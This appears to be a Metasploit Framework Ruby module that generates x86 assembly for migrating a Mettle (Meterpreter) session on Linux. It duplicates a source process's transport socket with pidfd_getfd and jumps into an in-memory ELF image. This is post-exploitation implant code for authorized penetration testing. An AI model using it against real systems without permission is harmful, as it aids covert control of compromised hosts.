# -*- coding: binary -*-
# frozen_string_literal: true

require 'rex/elfparsey'

module Msf
  # Payload that supports socket-preserving migrations on x86.
  module Payload::Linux::X86::MigrateTcp
    include Msf::Payload::Linux::X86::Migrate

    #
    # Duplicates the source Mettle transport and starts a Mettle process image.
    #
    def generate_migrate(opts = {})
      entry_offset = elf_entry_point(opts.fetch(:payload))

      %(
      pop ebx                    ; source Mettle pid
      xor ecx, ecx
      mov eax, 434               ; pidfd_open(pid, 0)
      int 0x80
      test eax, eax
      js migrate_failed

      pop ecx                    ; source transport fd
      mov ebx, eax               ; source Mettle pidfd
      xor edx, edx
      mov eax, 438               ; pidfd_getfd(pidfd, fd, 0)
      int 0x80
      test eax, eax
      js migrate_failed

      mov edi, eax               ; duplicated transport fd
      pop esi                    ; process image address

      and esp, -16
      add esp, 64
      push 0x6d                  ; argv[0] = "m"
      mov ecx, esp

      xor ebx, ebx
      push ebx                   ; AT_NULL value
      push ebx                   ; AT_NULL type
      push esi                   ; AT_BASE value
      push 7                     ; AT_BASE type
      push ebx                   ; envp terminator
      push ebx                   ; argv terminator
      push edi                   ; argv[1] = transport fd
      push ecx                   ; argv[0]
      push 2                     ; argc

      add esi, #{entry_offset}
      jmp esi

    migrate_failed:
      mov eax, 1                 ; exit(1)
      mov ebx, 1
      int 0x80
    )
    end

    private

    def elf_entry_point(payload)
      Rex::ElfParsey::Elf.new(Rex::ImageSource::Memory.new(payload)).elf_header.e_entry
    end
  end
end
